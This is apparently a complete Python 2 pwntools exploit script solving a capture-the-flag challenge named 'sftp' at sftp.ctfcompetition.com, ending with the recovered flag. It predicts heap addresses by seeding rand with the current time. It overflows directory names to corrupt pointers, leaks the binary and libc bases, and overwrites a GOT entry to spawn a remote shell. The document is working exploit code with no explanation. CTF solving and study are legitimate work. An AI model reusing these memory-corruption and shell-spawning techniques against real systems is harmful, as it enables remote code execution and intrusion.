#!/usr/bin/env python2

from ctypes import *
from pwn import *
import sys
import os
libc = cdll.LoadLibrary("libc.so.6")
elf = ELF('./sftp')

host, port = 'sftp.ctfcompetition.com', 1337
local = False
if len(sys.argv) == 1:
  host = '127.0.0.1'
  local = True

libc.srand(libc.time(None))

def malloc():
    return (libc.rand() & 0x1fffffff) + 0x40000000

def consume_malloc(n):
    for i in range(n):
        malloc()

root = malloc()

r = remote(host, port)
r.recvuntil('(yes/no)')
r.sendline('yes')
r.recvuntil('password')
r.sendline('BBBBBABBABBBBBA')

def pt(msg):
    r.recvuntil('sftp>')
    r.sendline(msg)

def create_file(name, data):
    pt('put ' + name)
    r.sendline(str(len(data)))
    r.send(data)

consume_malloc(8)
pt('mkdir ' + 'a' * (20 + 18 * 8) + p64(root - 12))
pt('cd ' + 'a' * 20 + '\x10')

pt('put s')
r.sendline('5\nmeow')

consume_malloc(16)
for i in range(16):
    pt('symlink s ' + 'a' + str(i))

pt('ls')
r.recvuntil('a15\n')
text = u64(r.recvn(6) + "\x00\x00") - 0x208be0
elf.address = text
log.info('text: ' + hex(text))

# round 2

consume_malloc(2)
r_ptr = malloc()
log.info('r_ptr: ' + hex(r_ptr))
pt('mkdir ' + 'b' * (20 + 18 * 8) + p64(r_ptr))
pt('cd ' + 'b' * 20 + '\x10')

def leak(addr):
    create_file('r', 'r' * 8 + p32(2) + 'leak'.ljust(20, '\x00') + p64(40) + p64(addr))
    pt('get leak')
    r.recvline()
    return r.recvn(8)

#  context.log_level = 'debug'
create_file('r', 'r' * 8 + p32(2) + 'leak'.ljust(20, '\x00') + p64(8) + p64(0))
for i in range(16):
    pt('symlink r ' + 'a' + str(i))

libc = u64(leak(elf.got['strrchr'])) - 0x8d400
log.info('libc @ ' + hex(libc))

create_file('leak', p64(libc + 0x45390))

pt('put sh')
r.interactive()

# CTF{Moar_Randomz_Moar_Mitigatez!}
